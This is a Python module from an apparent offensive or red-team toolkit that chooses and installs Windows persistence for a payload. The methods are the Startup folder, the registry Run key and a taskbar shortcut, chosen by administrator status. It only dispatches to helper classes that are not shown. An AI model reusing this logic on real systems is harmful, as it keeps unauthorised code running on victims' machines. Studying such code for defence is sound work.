"""
windows.py: Windows-specific persistence logic.
"""

from .base                                  import Persistence

from .windows_utilities.startup             import StartupFolder
from .windows_utilities.regrun              import RUNKEY
from .windows_utilities.shortcut            import TaskbarShortcut
from .windows_utilities.persistence_methods import WindowsPersistenceMethods
from .windows_utilities.permissions         import WindowsPrivilege


class WindowsPersistence(Persistence):
    """
    Windows-specific persistence logic.

    identifier: Administrator status (UAC) to install the payload as.
    """

    def __init__(self, payload: str, identifier: int, custom_method: str = None) -> None:
        super().__init__(payload, identifier, custom_method)

        # Inherited from Persistence class:
        self.payload
        self.identifier
        self.custom_method
        self.temp_dir
        self.recommended_method

        super().__post_init__()


    def _determine_recommended_persistence_method(self) -> str:
        """
        Determine the recommended persistence method for Windows.
        """
        if self.identifier == WindowsPrivilege.STANDARD_USER.value:
            return WindowsPersistenceMethods.STARTUP_CURRENT_USER.value

        return WindowsPersistenceMethods.STARTUP_GLOBAL.value


    def supported_persistence_methods(self) -> list:
        """
        Get a list of supported persistence methods for macOS.
        """
        methods = [method.value for method in WindowsPersistenceMethods]

        if self.identifier == WindowsPrivilege.STANDARD_USER.value:
            methods.remove(WindowsPersistenceMethods.REGEDIT_RUN.value)
            methods.remove(WindowsPersistenceMethods.STARTUP_GLOBAL.value)

        return methods


    def install(self) -> None:
        """
        Install payload.
        """
        method = self.configured_persistence_method()

        if method == WindowsPersistenceMethods.STARTUP_CURRENT_USER.value:
            StartupFolder(payload=self.payload).install_current_user()
            return
        if method == WindowsPersistenceMethods.STARTUP_GLOBAL.value:
            StartupFolder(payload=self.payload).install_global()
            return
        if method == WindowsPersistenceMethods.REGEDIT_RUN.value:
            RUNKEY(payload=self.payload).install()
            return
        if method == WindowsPersistenceMethods.SHORTCUT_USER.value:
            TaskbarShortcut(payload=self.payload).install()
            return

        raise NotImplementedError(f"Method {method} not implemented.")
